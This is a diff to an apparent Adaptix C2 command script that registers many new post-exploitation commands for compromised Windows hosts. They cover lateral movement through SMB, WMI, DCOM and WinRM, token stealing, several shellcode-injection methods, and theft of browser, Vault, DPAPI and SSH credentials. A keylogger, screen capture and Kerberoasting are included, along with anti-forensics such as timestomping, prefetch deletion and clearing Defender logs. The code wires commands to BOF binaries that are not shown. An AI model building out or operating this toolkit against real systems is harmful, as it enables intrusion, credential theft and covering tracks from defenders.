@@ -46,6 +46,11 @@ cmd_netstat.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netstat")}"`, "BOF: netstat");
 });
 
+var cmd_netconn = ax.create_command("bof-netconn", "TCP/UDP endpoints with the owning PID and process", "bof-netconn");
+cmd_netconn.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netconn")}"`, "BOF: netconn");
+});
+
 var cmd_routeprint = ax.create_command("bof-routeprint", "Show the IPv4 routing table", "bof-routeprint");
 cmd_routeprint.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "routeprint")}"`, "BOF: routeprint");
@@ -106,6 +111,13 @@ cmd_proclist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "proclist")}"`, "BOF: proclist");
 });
 
+var cmd_tasklist = ax.create_command("bof-tasklist", "Process list with full command lines", "bof-tasklist svchost");
+cmd_tasklist.addArgString("filter", "Substring filter on image or command line", "");
+cmd_tasklist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["filter"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "tasklist")}" ${params}`, "BOF: tasklist");
+});
+
 var cmd_services = ax.create_command("bof-services", "Enumerate Win32 services", "bof-services");
 cmd_services.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "services")}"`, "BOF: services");
@@ -114,6 +126,28 @@ cmd_services.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 var cmd_drivers = ax.create_command("bof-drivers", "Enumerate kernel drivers registered with SCM", "bof-drivers");
 cmd_drivers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drivers")}"`, "BOF: drivers");
+});
+
+var cmd_driversigs = ax.create_command("bof-driversigs", "Kernel drivers with Authenticode signature status", "bof-driversigs");
+cmd_driversigs.addArgString("filter", "Substring filter on service name or image path", "");
+cmd_driversigs.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["filter"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "driversigs")}" ${params}`, "BOF: driversigs");
+});
+
+var cmd_wmi_query = ax.create_command("bof-wmi_query", "Run a WQL query against ROOT\\CIMV2", "bof-wmi_query \"SELECT ProcessId,Name,CommandLine FROM Win32_Process\"");
+cmd_wmi_query.addArgString("query", true, "WQL query");
+cmd_wmi_query.addArgString("properties", "Comma-separated property names (empty = all)", "");
+cmd_wmi_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr", [parsed_json["query"], parsed_json["properties"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wmi_query")}" ${params}`, "BOF: wmi_query");
+});
+
+var cmd_msi_search = ax.create_command("bof-msi-search", "Installed MSI products with version and install path", "bof-msi-search chrome");
+cmd_msi_search.addArgString("keyword", "Case-insensitive filter on name, publisher or path", "");
+cmd_msi_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["keyword"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "msi-search")}" ${params}`, "BOF: msi-search");
 });
 
 /* ------------------------------------------------------------------ */
@@ -605,6 +639,13 @@ cmd_addmachineaccount.setPreHook(function (id, cmdline, parsed_json) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addmachineaccount")}" ${params}`, "BOF: addmachineaccount");
 });
 
+var cmd_kerberoast = ax.create_command("bof-kerberoast", "List Kerberoastable and AS-REP roastable accounts", "bof-kerberoast all");
+cmd_kerberoast.addArgString("mode", "spn, asrep or all", "all");
+cmd_kerberoast.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "kerberoast")}" ${params}`, "BOF: kerberoast");
+});
+
 var cmd_lapsdump = ax.create_command("bof-lapsdump", "Read LAPS passwords from AD", "bof-lapsdump");
 cmd_lapsdump.setPreHook(function (id, cmdline) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "lapsdump")}"`, "BOF: lapsdump");
@@ -1002,6 +1043,318 @@ cmd_adcs_enum_com2.setPreHook(function (id, cmdline, parsed_json) {
     ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
 });
 
+var cmd_dllhijack = ax.create_command("bof-dllhijack", "Find service DLL/path search-order hijack candidates", "bof-dllhijack all");
+cmd_dllhijack.addArgString("mode", "services, appinit or all", "services");
+cmd_dllhijack.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dllhijack")}" ${params}`, "BOF: dllhijack");
+});
+
+/* ------------------------------------------------------------------ */
+/* Lateral movement                                                    */
+/* ------------------------------------------------------------------ */
+
+var cmd_smbexec = ax.create_command("bof-smbexec", "Remote command execution via temporary SCM service", "bof-smbexec DC01 \"whoami > C:\\Windows\\Temp\\out.txt\"");
+cmd_smbexec.addArgString("host", true, "Target host");
+cmd_smbexec.addArgString("command", true, "Command line to run");
+cmd_smbexec.addArgString("service", "Service name", "bofsmbexec");
+cmd_smbexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["host"], parsed_json["command"], parsed_json["service"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "smbexec")}" ${params}`, "BOF: smbexec");
+});
+
+var cmd_wmiexec = ax.create_command("bof-wmiexec", "Remote execution through Win32_Process::Create", "bof-wmiexec DC01 \"cmd.exe /c whoami\"");
+cmd_wmiexec.addArgString("host", true, "Target host or . for local");
+cmd_wmiexec.addArgString("command", true, "Command line to run");
+cmd_wmiexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr", [parsed_json["host"], parsed_json["command"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wmiexec")}" ${params}`, "BOF: wmiexec");
+});
+
+var cmd_dcomexec = ax.create_command("bof-dcomexec", "Remote execution through the Shell.Application DCOM object", "bof-dcomexec DC01 cmd.exe \"/c whoami\"");
+cmd_dcomexec.addArgString("host", true, "Target host");
+cmd_dcomexec.addArgString("command", true, "Executable to launch");
+cmd_dcomexec.addArgString("args", "Arguments for the executable", "");
+cmd_dcomexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["host"], parsed_json["command"], parsed_json["args"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dcomexec")}" ${params}`, "BOF: dcomexec");
+});
+
+var cmd_scshell = ax.create_command("bof-scshell", "Fileless execution by reconfiguring an existing service", "bof-scshell DC01 Browser \"cmd.exe /c whoami\"");
+cmd_scshell.addArgString("host", true, "Target host or . for local");
+cmd_scshell.addArgString("service", true, "Existing service name");
+cmd_scshell.addArgString("command", true, "Command line to run");
+cmd_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["host"], parsed_json["service"], parsed_json["command"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "scshell")}" ${params}`, "BOF: scshell");
+});
+
+var cmd_winrm_exec = ax.create_command("bof-winrm-exec", "Remote execution over WinRM using winrs.exe", "bof-winrm-exec DC01 \"whoami\"");
+cmd_winrm_exec.addArgString("host", true, "Hostname, host:port or WS-Man URL");
+cmd_winrm_exec.addArgString("command", true, "Command to run");
+cmd_winrm_exec.addArgString("user", "Optional username", "");
+cmd_winrm_exec.addArgString("password", "Optional password", "");
+cmd_winrm_exec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr,cstr", [parsed_json["host"], parsed_json["command"], parsed_json["user"], parsed_json["password"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "winrm-exec")}" ${params}`, "BOF: winrm-exec");
+});
+
+/* ------------------------------------------------------------------ */
+/* Token / impersonation                                               */
+/* ------------------------------------------------------------------ */
+
+var cmd_maketoken = ax.create_command("bof-maketoken", "Create and impersonate a token from plaintext credentials", "bof-maketoken alice Passw0rd! CORP");
+cmd_maketoken.addArgString("user", true, "Username");
+cmd_maketoken.addArgString("password", true, "Plaintext password");
+cmd_maketoken.addArgString("domain", "Domain or . for local", ".");
+cmd_maketoken.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["user"], parsed_json["password"], parsed_json["domain"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "maketoken")}" ${params}`, "BOF: maketoken");
+});
+
+var cmd_stealtoken = ax.create_command("bof-stealtoken", "Duplicate and impersonate the token of a PID", "bof-stealtoken 1234");
+cmd_stealtoken.addArgInt("pid", "Target process ID", 0);
+cmd_stealtoken.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("int", [parsed_json["pid"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "stealtoken")}" ${params}`, "BOF: stealtoken");
+});
+
+var cmd_reverttoken = ax.create_command("bof-reverttoken", "Drop thread impersonation with RevertToSelf", "bof-reverttoken");
+cmd_reverttoken.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "reverttoken")}"`, "BOF: reverttoken");
+});
+
+var cmd_listimpersonation = ax.create_command("bof-listimpersonation", "Show thread impersonation token and process primary token", "bof-listimpersonation");
+cmd_listimpersonation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listimpersonation")}"`, "BOF: listimpersonation");
+});
+
+var cmd_getsystem_svc = ax.create_command("bof-getsystem-svc", "Named-pipe impersonation server for a SYSTEM coercion", "bof-getsystem-svc bof_getsystem 30");
+cmd_getsystem_svc.addArgString("pipe", "Named pipe name", "bof_getsystem");
+cmd_getsystem_svc.addArgInt("timeout", "Seconds to wait for a client", 30);
+cmd_getsystem_svc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,int", [parsed_json["pipe"], parsed_json["timeout"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "getsystem-svc")}" ${params}`, "BOF: getsystem-svc");
+});
+
+/* ------------------------------------------------------------------ */
+/* Process injection                                                   */
+/* ------------------------------------------------------------------ */
+
+var cmd_injectapc = ax.create_command("bof-injectapc", "Queue APC shellcode injection into a process", "bof-injectapc 1234 C:\\Windows\\Temp\\payload.bin");
+cmd_injectapc.addArgInt("pid", "Target process ID", 0);
+cmd_injectapc.addArgString("file", true, "Shellcode file");
+cmd_injectapc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["file"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "injectapc")}" ${params}`, "BOF: injectapc");
+});
+
+var cmd_injectthread = ax.create_command("bof-injectthread", "Remote thread injection through NtCreateThreadEx", "bof-injectthread 1234 C:\\Windows\\Temp\\payload.bin");
+cmd_injectthread.addArgInt("pid", "Target process ID", 0);
+cmd_injectthread.addArgString("file", true, "Shellcode file");
+cmd_injectthread.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["file"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "injectthread")}" ${params}`, "BOF: injectthread");
+});
+
+var cmd_earlybird = ax.create_command("bof-earlybird", "APC injection into a suspended process before entry point", "bof-earlybird C:\\Windows\\System32\\notepad.exe C:\\Windows\\Temp\\payload.bin");
+cmd_earlybird.addArgString("exe", true, "Executable to spawn suspended");
+cmd_earlybird.addArgString("file", true, "Shellcode file");
+cmd_earlybird.addArgString("args", "Arguments for the executable", "");
+cmd_earlybird.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["exe"], parsed_json["file"], parsed_json["args"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "earlybird")}" ${params}`, "BOF: earlybird");
+});
+
+var cmd_ghostwrite = ax.create_command("bof-ghostwrite", "Section-backed injection without WriteProcessMemory", "bof-ghostwrite 1234 C:\\Windows\\Temp\\payload.bin");
+cmd_ghostwrite.addArgInt("pid", "Target process ID", 0);
+cmd_ghostwrite.addArgString("file", true, "Shellcode file");
+cmd_ghostwrite.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["file"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ghostwrite")}" ${params}`, "BOF: ghostwrite");
+});
+
+/* ------------------------------------------------------------------ */
+/* Credential access                                                   */
+/* ------------------------------------------------------------------ */
+
+var cmd_vaultdump = ax.create_command("bof-vaultdump", "Enumerate Windows Vault containers and items", "bof-vaultdump");
+cmd_vaultdump.addArgString("vault", "Vault GUID or schema name filter", "");
+cmd_vaultdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["vault"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vaultdump")}" ${params}`, "BOF: vaultdump");
+});
+
+var cmd_dpapiblobdec = ax.create_command("bof-dpapiblobdec", "Decrypt a DPAPI blob (hex) in the current user context", "bof-dpapiblobdec 01000000d08c9ddf...");
+cmd_dpapiblobdec.addArgString("blob", true, "DPAPI blob as hex");
+cmd_dpapiblobdec.addArgString("entropy", "Optional entropy as hex", "");
+cmd_dpapiblobdec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr", [parsed_json["blob"], parsed_json["entropy"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dpapiblobdec")}" ${params}`, "BOF: dpapiblobdec");
+});
+
+var cmd_chromecreds = ax.create_command("bof-chromecreds", "Read saved Chrome / Edge logins from Login Data", "bof-chromecreds all");
+cmd_chromecreds.addArgString("browser", "chrome, edge or all", "all");
+cmd_chromecreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["browser"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "chromecreds")}" ${params}`, "BOF: chromecreds");
+});
+
+var cmd_recentfiles = ax.create_command("bof-recentfiles", "Enumerate Recent LNKs, jump lists and targets", "bof-recentfiles");
+cmd_recentfiles.addArgString("directory", "Optional extra directory to list", "");
+cmd_recentfiles.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["directory"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "recentfiles")}" ${params}`, "BOF: recentfiles");
+});
+
+var cmd_sshagentkeys = ax.create_command("bof-sshagentkeys", "List identities held by the running OpenSSH agent", "bof-sshagentkeys");
+cmd_sshagentkeys.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "sshagentkeys")}"`, "BOF: sshagentkeys");
+});
+
+/* ------------------------------------------------------------------ */
+/* Defense evasion                                                     */
+/* ------------------------------------------------------------------ */
+
+var cmd_ppidspoof = ax.create_command("bof-ppidspoof", "Spawn a process with a spoofed parent PID", "bof-ppidspoof 1234 C:\\Windows\\System32\\cmd.exe");
+cmd_ppidspoof.addArgInt("ppid", "Parent process ID", 0);
+cmd_ppidspoof.addArgString("command", true, "Executable to spawn");
+cmd_ppidspoof.addArgString("args", "Optional arguments", "");
+cmd_ppidspoof.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("int,cstr,cstr", [parsed_json["ppid"], parsed_json["command"], parsed_json["args"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ppidspoof")}" ${params}`, "BOF: ppidspoof");
+});
+
+var cmd_blockdlls = ax.create_command("bof-blockdlls", "Spawn a child with non-Microsoft DLL blocking", "bof-blockdlls C:\\Windows\\System32\\cmd.exe");
+cmd_blockdlls.addArgString("command", true, "Executable to spawn");
+cmd_blockdlls.addArgString("args", "Optional arguments", "");
+cmd_blockdlls.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr", [parsed_json["command"], parsed_json["args"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "blockdlls")}" ${params}`, "BOF: blockdlls");
+});
+
+var cmd_acldeny = ax.create_command("bof-acldeny", "Add a deny ACE to a file or registry key DACL", "bof-acldeny file C:\\Windows\\Temp\\payload.exe S-1-5-32-545");
+cmd_acldeny.addArgString("kind", true, "file, dir or reg");
+cmd_acldeny.addArgString("path", true, "File path or registry key");
+cmd_acldeny.addArgString("trustee", "SID or account name (default Everyone)", "S-1-1-0");
+cmd_acldeny.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["kind"], parsed_json["path"], parsed_json["trustee"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "acldeny")}" ${params}`, "BOF: acldeny");
+});
+
+var cmd_timestomp = ax.create_command("bof-timestomp", "Overwrite file timestamps with SetFileTime", "bof-timestomp C:\\Windows\\Temp\\payload.exe \"2024-01-01 12:00:00\"");
+cmd_timestomp.addArgString("path", true, "Target file");
+cmd_timestomp.addArgString("timestamp", "Timestamp, empty for now, or copy", "");
+cmd_timestomp.addArgString("source", "Source file for copy", "");
+cmd_timestomp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["path"], parsed_json["timestamp"], parsed_json["source"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "timestomp")}" ${params}`, "BOF: timestomp");
+});
+
+var cmd_schtaskshide = ax.create_command("bof-schtaskshide", "Deny Users read access to a scheduled task", "bof-schtaskshide \\Microsoft\\Windows\\MyTask");
+cmd_schtaskshide.addArgString("task", true, "Task path, e.g. \\Folder\\Name");
+cmd_schtaskshide.addArgString("mode", "Empty to hide, restore to undo", "");
+cmd_schtaskshide.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,cstr", [parsed_json["task"], parsed_json["mode"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtaskshide")}" ${params}`, "BOF: schtaskshide");
+});
+
+/* ------------------------------------------------------------------ */
+/* Recon / situational awareness (extended)                            */
+/* ------------------------------------------------------------------ */
+
+var cmd_screenspy = ax.create_command("bof-screenspy", "Repeated screenshot capture at a fixed interval", "bof-screenspy C:\\Windows\\Temp\\shots 5 5");
+cmd_screenspy.addArgString("directory", "Output directory (empty = %TEMP%\\bof_screenspy)", "");
+cmd_screenspy.addArgInt("interval", "Seconds between captures", 5);
+cmd_screenspy.addArgInt("count", "Number of captures", 5);
+cmd_screenspy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,int,int", [parsed_json["directory"], parsed_json["interval"], parsed_json["count"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "screenspy")}" ${params}`, "BOF: screenspy");
+});
+
+var cmd_keylogger = ax.create_command("bof-keylogger", "Low-level keyboard hook that flushes after N seconds", "bof-keylogger 30");
+cmd_keylogger.addArgInt("seconds", "Capture duration", 30);
+cmd_keylogger.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("int", [parsed_json["seconds"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "keylogger")}" ${params}`, "BOF: keylogger");
+});
+
+var cmd_browserhist = ax.create_command("bof-browserhist", "Read recent Chrome / Edge history entries", "bof-browserhist all 50");
+cmd_browserhist.addArgString("browser", "chrome, edge or all", "all");
+cmd_browserhist.addArgInt("count", "Maximum entries", 50);
+cmd_browserhist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,int", [parsed_json["browser"], parsed_json["count"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "browserhist")}" ${params}`, "BOF: browserhist");
+});
+
+var cmd_findcreds = ax.create_command("bof-findcreds", "Recursive search for credential-bearing files", "bof-findcreds C:\\Users 6");
+cmd_findcreds.addArgString("root", "Directory or file to scan (empty = %USERPROFILE%)", "");
+cmd_findcreds.addArgInt("depth", "Maximum directory depth", 6);
+cmd_findcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr,int", [parsed_json["root"], parsed_json["depth"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "findcreds")}" ${params}`, "BOF: findcreds");
+});
+
+/* ------------------------------------------------------------------ */
+/* Active Directory / Kerberos                                        */
+/* ------------------------------------------------------------------ */
+
+var cmd_spnroast = ax.create_command("bof-spnroast", "Request Kerberoastable service tickets with SSPI", "bof-spnroast");
+cmd_spnroast.addArgString("spn", "Optional single SPN to roast", "");
+cmd_spnroast.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["spn"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "spnroast")}" ${params}`, "BOF: spnroast");
+});
+
+var cmd_asreproast = ax.create_command("bof-asreproast", "Find AS-REP roastable accounts (no pre-auth)", "bof-asreproast");
+cmd_asreproast.addArgString("filter", "Optional sAMAccountName / UPN substring", "");
+cmd_asreproast.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["filter"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "asreproast")}" ${params}`, "BOF: asreproast");
+});
+
+var cmd_gpocheck = ax.create_command("bof-gpocheck", "Enumerate GPOs, links and decrypt cpassword values", "bof-gpocheck");
+cmd_gpocheck.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "gpocheck")}"`, "BOF: gpocheck");
+});
+
+var cmd_trustdump = ax.create_command("bof-trustdump", "Map domain trusts with DsEnumerateDomainTrusts", "bof-trustdump");
+cmd_trustdump.addArgString("domain", "Domain to query (empty = local)", "");
+cmd_trustdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "trustdump")}" ${params}`, "BOF: trustdump");
+});
+
+/* ------------------------------------------------------------------ */
+/* Utility / OPSEC housekeeping                                       */
+/* ------------------------------------------------------------------ */
+
+var cmd_selfdelete = ax.create_command("bof-selfdelete", "Delete the agent image on reboot or via a helper", "bof-selfdelete reboot");
+cmd_selfdelete.addArgString("mode", "reboot, force or empty", "");
+cmd_selfdelete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "selfdelete")}" ${params}`, "BOF: selfdelete");
+});
+
+var cmd_prefetchdel = ax.create_command("bof-prefetchdel", "Delete prefetch entries for a binary", "bof-prefetchdel mimikatz.exe");
+cmd_prefetchdel.addArgString("name", true, "Binary name or full path");
+cmd_prefetchdel.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["name"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "prefetchdel")}" ${params}`, "BOF: prefetchdel");
+});
+
+var cmd_threadhide = ax.create_command("bof-threadhide", "Hide the current thread from debuggers", "bof-threadhide");
+cmd_threadhide.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "threadhide")}"`, "BOF: threadhide");
+});
+
+var cmd_clearmplog = ax.create_command("bof-clearmplog", "Clear Windows Defender event logs", "bof-clearmplog all");
+cmd_clearmplog.addArgString("channel", "Channel name, all, or empty for Defender/Operational", "");
+cmd_clearmplog.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = ax.bof_pack("cstr", [parsed_json["channel"]]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "clearmplog")}" ${params}`, "BOF: clearmplog");
+});
+
 /* ------------------------------------------------------------------ */
 /* Registration                                                        */
 /* ------------------------------------------------------------------ */
@@ -1017,7 +1370,9 @@ var group_recon = ax.create_commands_group("AdaptixBOFKit-Recon", [
     cmd_vulndrivers, cmd_enumdotnet, cmd_safeharbor, cmd_enumdrives, cmd_enumlib,
     cmd_cacls, cmd_geolocation, cmd_evtxsearch, cmd_finduserhooks,
     cmd_enumhandles, cmd_enumhandles_alias, cmd_processhandles,
-    cmd_processhandles_alias, cmd_killprocess, cmd_vssenum, cmd_wfpenum
+    cmd_processhandles_alias, cmd_killprocess, cmd_vssenum, cmd_wfpenum,
+    cmd_tasklist, cmd_netconn, cmd_driversigs, cmd_wmi_query, cmd_msi_search,
+    cmd_screenspy, cmd_keylogger, cmd_browserhist, cmd_findcreds
 ]);
 ax.register_commands_group(group_recon, ["beacon"], ["windows"], []);
 
@@ -1025,7 +1380,8 @@ var group_network = ax.create_commands_group("AdaptixBOFKit-Network", [
     cmd_portscan, cmd_nslookup, cmd_netshares, cmd_netview, cmd_netuse,
     cmd_netuse_list, cmd_nettime, cmd_netloggedon, cmd_netsession,
     cmd_listdns, cmd_probe, cmd_smbinfo, cmd_enumwebclient,
-    cmd_portscanbof, cmd_netsession2, cmd_netuse_add, cmd_nbtscan
+    cmd_portscanbof, cmd_netsession2, cmd_netuse_add, cmd_nbtscan,
+    cmd_smbexec, cmd_wmiexec, cmd_dcomexec, cmd_scshell, cmd_winrm_exec
 ]);
 ax.register_commands_group(group_network, ["beacon"], ["windows"], []);
 
@@ -1035,7 +1391,8 @@ var group_ad = ax.create_commands_group("AdaptixBOFKit-AD", [
     cmd_ldapsearch, cmd_addmachineaccount, cmd_lapsdump,
     cmd_netgrouplist, cmd_netgrouplistmembers, cmd_netgrouplistmembers2,
     cmd_netlocalgrouplist, cmd_netlocalgrouplistmembers, cmd_get_password_policy,
-    cmd_adcs_enum, cmd_adcs_enum_com, cmd_adcs_enum_com2, cmd_ldapsecuritycheck
+    cmd_adcs_enum, cmd_adcs_enum_com, cmd_adcs_enum_com2, cmd_ldapsecuritycheck,
+    cmd_kerberoast, cmd_spnroast, cmd_asreproast, cmd_gpocheck, cmd_trustdump
 ]);
 ax.register_commands_group(group_ad, ["beacon"], ["windows"], []);
 
@@ -1043,7 +1400,9 @@ var group_creds = ax.create_commands_group("AdaptixBOFKit-Creds", [
     cmd_credman, cmd_wifi, cmd_autologon,
     cmd_procdump, cmd_regsave, cmd_dpapissystem, cmd_certdump,
     cmd_clipboard, cmd_notethief, cmd_klist, cmd_kerbhash,
-    cmd_dumpwifi, cmd_wifipasswords
+    cmd_dumpwifi, cmd_wifipasswords,
+    cmd_vaultdump, cmd_dpapiblobdec, cmd_chromecreds, cmd_recentfiles,
+    cmd_sshagentkeys
 ]);
 ax.register_commands_group(group_creds, ["beacon"], ["windows"], []);
 
@@ -1051,7 +1410,11 @@ var group_privesc = ax.create_commands_group("AdaptixBOFKit-Privesc-Evasion", [
     cmd_tokenpriv, cmd_uacstatus, cmd_unhook, cmd_etwpatch, cmd_amsipatch,
     cmd_hidefile, cmd_cleareventlog, cmd_addexclusion,
     cmd_enableefs, cmd_blindeventlog, cmd_enumexclusions, cmd_delexclusion,
-    cmd_get_priv, cmd_startwebclient
+    cmd_get_priv, cmd_startwebclient, cmd_dllhijack,
+    cmd_maketoken, cmd_stealtoken, cmd_reverttoken, cmd_listimpersonation,
+    cmd_getsystem_svc, cmd_injectapc, cmd_injectthread, cmd_earlybird,
+    cmd_ghostwrite, cmd_ppidspoof, cmd_blockdlls, cmd_acldeny,
+    cmd_timestomp, cmd_schtaskshide, cmd_threadhide
 ]);
 ax.register_commands_group(group_privesc, ["beacon"], ["windows"], []);
 
@@ -1068,6 +1431,6 @@ ax.register_commands_group(group_persist, ["beacon"], ["windows"], []);
 var group_post = ax.create_commands_group("AdaptixBOFKit-Post", [
     cmd_inject, cmd_hashfile, cmd_download,
     cmd_screenshot, cmd_enumfiles, cmd_md5, cmd_sha1, cmd_sha256,
-    cmd_executesession
+    cmd_executesession, cmd_selfdelete, cmd_prefetchdel, cmd_clearmplog
 ]);
 ax.register_commands_group(group_post, ["beacon"], ["windows"], []);
